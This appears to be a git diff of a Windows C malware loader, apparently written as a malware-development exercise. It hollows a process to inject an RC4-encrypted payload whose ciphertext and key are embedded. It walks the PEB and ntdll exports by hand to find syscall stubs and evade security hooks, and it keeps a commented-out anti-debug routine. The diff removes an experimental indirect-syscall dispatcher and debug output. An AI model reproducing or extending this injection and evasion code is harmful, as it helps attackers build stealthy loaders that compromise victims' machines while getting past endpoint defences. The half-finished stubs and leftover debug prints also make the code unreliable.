@@ -3,12 +3,6 @@
 #include <Windows.h>
 #include "headers.h"
 
-//PVOID* pSystemCalls = NULL; //allocate PVOID * dwDLLSize memory for our array of pointers
-
-#define num_syscalls 50 //kinda expiremental , i sorta wnat this defined early on so i can just in and start populating
-PVOID* pSystemCalls[num_syscalls];
-VX_TABLE VxTable = { 0 };
-
 typedef struct _SYSCALL {
     PVOID   pAddress;
     DWORD   dwHash;
@@ -24,18 +18,6 @@ typedef struct _SYSCALLS {
 }SYSCALLS_STRUCT, * PSYSCALLS_STRUCT;
 
 SYSCALLS_STRUCT syscallsStruct = { 0 };
-
-void initializeSystemCalls() {
-
-    if (pSystemCalls == NULL) {
-        printf("Mem allocation error\n");
-        exit(1);
-    }
-    printf("Address of pSystemCalls(it should all be zero'd....: 0x%p\n", pSystemCalls);
-
-    printf("Size of pSystemCalls %zu\n", num_syscalls);
-}
-
 
 //Maldev Academy Rc4
 BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {
@@ -106,9 +88,7 @@ unsigned char Rc4CipherText[] = {
 
 unsigned char Rc4Key[] = {
         0x4E, 0x17, 0xAB, 0x94, 0x9F, 0x1B, 0xFD, 0xCB, 0xB0, 0x02, 0x40, 0x57, 0x49, 0xBD, 0xB2, 0x50 };
-DWORD gSSN = 0;
-PVOID gJMP = NULL;
-WORD gCurrentSyscall = 0;
+
 
 
 
@@ -119,11 +99,6 @@ void printByteArray(const unsigned char* array, size_t size) {
     }
     printf("\n", array);
 }
-
-
-
-
-
 
 /* Havent converted to unhooked syscalls yet - on the to do list also.. but to see how I've demonstrated the capability to do so with hollowProcess func
 void detectDebug() {
@@ -174,72 +149,13 @@ void detectDebug() {
 
     return FALSE;
 }
-*/
-
-
-EXTERN_C void UpdateGlobals(DWORD input) {
-    printf("Indexes of systemcalls %d\n", sizeof(pSystemCalls) / sizeof(pSystemCalls[0]));
-    uint64_t address = pSystemCalls[rand() % (sizeof(pSystemCalls) / sizeof(pSystemCalls[0]))];    //PVOID address = (PVOID)(0xdeadbeef);
-    //PVOID address = (PVOID)(0xdeadbeef);
-    //uint64_t* address = (uint64_t*)0x00007FF97312D232;
-
-    printf("Getting JMP! 0x%p\n", address);
-    gJMP = address;
-    uint64_t address2 = (uint64_t)address;
-    PULONG oldProts = NULL;
-    getchar();
-    printf("Input val to UpdateGloabls: %d\n", input);
-    getchar();
-
-    if (input == 0) { //Read
-        printf("Wow! Read Syscall Getter called: %d\n", VxTable.Read.wSystemCall);
-        printf("gSSN: 0x%p", &gSSN);
-        gSSN = VxTable.Read.wSystemCall;
-        getchar();
-        return (DWORD)VxTable.Read.wSystemCall;
-    }
-    else if (input == 1) { //Write
-        printf("Wow! WRite Syscall Getter called: %d\n", VxTable.Write.wSystemCall);
-        printf("gSSN: 0x%p", &gSSN);
-        gSSN = VxTable.Write.wSystemCall;
-        getchar();
-        return (DWORD)VxTable.Write.wSystemCall;
-    }
-    else if (input == 2) { //Allocate
-        return VxTable.Allocate.wSystemCall;
-    }
-    else if (input == 3) { //Protect
-        printf("Wow! Protect Syscall Getter called: %d\n", VxTable.Protect.wSystemCall);
-        printf("gSSN: 0x%p", &gSSN);
-        gSSN = VxTable.Protect.wSystemCall;
-        getchar();
-        return VxTable.Protect.wSystemCall;
-    }
-    else if (input == 4) { //ResumeThread
-        printf("Wow! Resume Syscall Getter called: %d\n", VxTable.ResumeThread.wSystemCall);
-        printf("gSSN: 0x%p", &gSSN);
-        gSSN = VxTable.ResumeThread.wSystemCall;
-        getchar();
-        return VxTable.ResumeThread.wSystemCall;
-    }
-    else if (input == 5) { //QueryInfoProcess
-        printf("Wow! QueryInfo Syscall Getter called: %d\n", VxTable.QueryInfoProcess.wSystemCall);
-        printf("gSSN: 0x%p", &gSSN);
-        gSSN = VxTable.QueryInfoProcess.wSystemCall;
-        getchar();
-        return VxTable.QueryInfoProcess.wSystemCall;
-    }
-    printf("Syscall input not found, check your input in C or RCX\n");
-
-}
-
 
 #define NEW_STREAM L":Noah"
 BOOL DeletesSelf() {
 
     //still need to go back and make this myself
 }
-
+*/
 
 //Also not that this is essentially a custom GetModuleHandle??? 
 void GetBase(IN PPEB pPEB, OUT PVOID* pBaseAddr,wchar_t* moduleName) {
@@ -322,7 +238,6 @@ void GetImageExportDir(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExport
             PBYTE opcode1 = *((PBYTE)pbFuncAddress + byteCounter);
             PBYTE opcode2 = *((PBYTE)pbFuncAddress + byteCounter + 1);
             printf("IS THIS WORKING?????? 0x%p : %02X %02X\n", (pbFuncAddress + byteCounter), opcode1, opcode2);
-            pSystemCalls[counter] = (PVOID)((PBYTE)pbFuncAddress + byteCounter);
             counter++;
             byteCounter = 0;
 
@@ -538,8 +453,6 @@ BOOL hollowProcess(PROCESS_INFORMATION Pi, SIZE_T sPayload) {
 
     PVOID sizeTest = (PVOID)sPayload;
 
-    printf("gCurrentSyscall: %d\n", gCurrentSyscall);
-    printf("Protect Num: %d\n", VxTable.Protect.wRCXVal);
     //Goal: gCurrentSyscall = VxTable.Protect.wRCXVal;
     //result = NoahRead3(Pi.hProcess, &entrypointAddr, &sizeTest, PAGE_EXECUTE_READWRITE, &oldPerm);
     result = ProtectFunc(Pi.hProcess, &entrypointAddr, &sizeTest, PAGE_EXECUTE_READWRITE, &oldPerm);
@@ -583,7 +496,6 @@ BOOL hollowProcess(PROCESS_INFORMATION Pi, SIZE_T sPayload) {
 
 int main() {
 
-    initializeSystemCalls();
 
     PTEB pCurrentTeb = (void*)__readgsqword(0x30); //Find the address of Thread Environment Block.
     //Read from GS register at 0x30 offset for TEB
